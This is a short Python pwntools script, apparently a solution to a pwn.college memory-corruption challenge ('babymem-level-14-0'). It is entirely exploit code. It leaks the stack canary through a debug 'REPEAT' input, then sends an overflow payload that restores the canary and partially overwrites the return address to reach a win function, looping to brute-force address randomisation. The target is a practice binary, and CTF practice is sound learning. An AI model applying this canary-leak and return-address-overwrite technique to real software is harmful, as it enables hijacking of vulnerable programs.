from pwn import *


for i in range(256):
    print(f'try {i}')
    proc = process('/challenge/babymem-level-14-0')
    proc.recvuntil(b'size: ')
    proc.sendline(b'8')
    proc.recvuntil(b'!\n')
    payload_to_backdoor = b'aREPEATb'
    proc.sendline(payload_to_backdoor)
    proc.recvuntil(b'the canary value is now ')
    canary_value_str = proc.recvline().strip()[:-1].decode()
    canary_value_int = int(canary_value_str[2:], 16)

    offset_to_canary = 328
    offset_win_authed = p16(0x1fc6)
    proc.recvuntil(b'size: ')
    # offset_to_canary + 16 (8 canary + 8 rbp) + 2 nibble di offset win
    size = offset_to_canary + 16 + 2
    proc.sendline(str(size).encode())
    proc.recvuntil(b')!\n')
    payload = b'A' * offset_to_canary + p64(canary_value_int) + b'B' * 8 + offset_win_authed
    proc.sendline(payload)
    proc.recv()

    try:
        r = proc.recv()
        # print(r)
        if b'pwn' in r:
            print(r)
            break
    except EOFError:
        pass
    proc.close()
